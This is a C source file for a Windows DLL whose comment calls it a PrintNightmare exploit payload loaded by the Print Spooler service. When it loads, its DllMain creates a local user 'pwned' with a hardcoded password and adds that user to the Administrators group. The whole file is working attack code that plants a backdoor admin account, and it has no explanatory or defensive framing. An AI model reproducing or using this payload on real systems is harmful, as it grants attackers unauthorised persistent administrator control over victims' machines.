#include <windows.h>
#include <lm.h>
#pragma comment(lib, "netapi32.lib")

// PrintNightmare DLL - Adds local admin user "pwned" with password "Pwn3d!@#123"
// Entry point is DllMain, called when Print Spooler loads the driver

BOOL AddLocalAdmin() {
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_3 lmi;
    NET_API_STATUS nStatus;

    wchar_t username[] = L"pwned";
    wchar_t password[] = L"Pwn3d!@#123";
    wchar_t adminGroup[] = L"Administrators";

    // Create user
    ui.usri1_name = username;
    ui.usri1_password = password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;

    nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);

    // Add to Administrators group
    lmi.lgrmi3_domainandname = username;
    NetLocalGroupAddMembers(NULL, adminGroup, 3, (LPBYTE)&lmi, 1);

    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        AddLocalAdmin();
    }
    return TRUE;
}
